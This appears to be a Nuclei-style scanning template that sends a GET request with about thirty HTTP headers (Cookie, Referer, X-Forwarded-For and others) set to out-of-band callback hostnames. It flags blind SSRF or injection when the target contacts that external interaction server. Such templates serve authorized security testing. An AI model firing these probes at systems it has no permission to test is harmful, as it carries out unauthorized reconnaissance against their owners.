id: OOB-RCE-SSRF-TEST
info:
  author: 25
  name: URL interaction
  severity: high
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  headers:
    Accept: accept.{{interactsh-url}}
    Accept-Encoding: acceptencoding.{{interactsh-url}}
    Accept-Language: acceptlanguage.{{interactsh-url}}
    Access-Control-Request-Headers: accesscontrolrequestheaders.{{interactsh-url}}
    Access-Control-Request-Method: accesscontrolrequestmethod.{{interactsh-url}}
    Authentication: authentication.{{interactsh-url}}
    CF-Connecting_IP: cfconnectingip.{{interactsh-url}}
    Client-IP: clientip.{{interactsh-url}}
    Contact: root@contact.{{interactsh-url}}
    Cookie: cookie.{{interactsh-url}}
    Forwarded: forwarded.{{interactsh-url}}
    From: root@from.{{interactsh-url}}
    Location: location.{{interactsh-url}}
    Origin: origin.{{interactsh-url}}
    Referer: http://referer.{{interactsh-url}}/ref
    True-Client-IP: trueclientip.{{interactsh-url}}
    Upgrade-Insecure-Requests: upgradeinsecurerequests.{{interactsh-url}}
    User-Agent: root@useragent.{{interactsh-url}}
    X-Api-Version: xapiversion.{{interactsh-url}}
    X-CSRF-Token: xcsrftoken.{{interactsh-url}}
    X-Client-IP: xclientip.{{interactsh-url}}
    X-Druid-Comment: xdruidcomment.{{interactsh-url}}
    X-Forwarded-For: xforwardedfor.{{interactsh-url}}
    X-Forwarded-Host: xforwardedhost.{{interactsh-url}}
    X-Forwarded-Server: xforwardedserver.{{interactsh-url}}
    X-HTTP-Host-Override: xhttphostoverride.{{interactsh-url}}
    X-Host: xhost.{{interactsh-url}}
    X-Origin: xorigin.{{interactsh-url}}
    X-Originating-IP: xoriginatingip.{{interactsh-url}}
    X-Real-IP: xrealip.{{interactsh-url}}
    X-User-Id: xuserid.{{interactsh-url}}
    X-Wap-Profile: http://xwapprofile.{{interactsh-url}}/wap.xml
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    regex:
    - ([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
